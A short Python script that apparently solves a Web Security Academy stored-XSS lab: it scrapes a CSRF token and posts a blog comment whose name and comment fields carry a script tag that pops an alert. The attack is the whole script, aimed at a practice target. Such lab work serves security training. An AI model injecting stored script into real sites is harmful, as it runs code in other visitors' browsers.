# Stored XSS into HTML context with nothing encoded

import requests
import re

url = "https://0a35004c046e1c60c07402fe00b0003d.web-security-academy.net/"

cookies = dict(session="tXNuhuunUsUeewM73CEwtNXThpEGNXdO")

session = requests.Session()

r1 = session.get(url + 'post', params=dict(postId='6'), cookies=cookies)
csrf = re.findall(r'name="csrf" value="(.*)">', r1.text)

data = {
	"csrf": csrf[0],
	"postId": "6",
	"name": "<script>alert(window.location)</script>",
	"email": "test@test.com",
	"website": "http://google.com",
	"comment": "<script>alert(window.location)</script>",
}

session.post(url + 'post/comment', data=data, cookies=cookies)
